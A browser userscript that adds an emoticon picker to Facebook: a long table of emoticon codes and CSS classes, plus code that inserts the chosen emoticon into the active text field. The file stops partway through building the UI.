// ==UserScript==
// @name            ICON FACEBOOK NEW 2014 (y)
// @description     All about facebook By DUNG CHE
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "Gru?ƒÂ±?ƒÂ³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "Ping?ƒÂ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
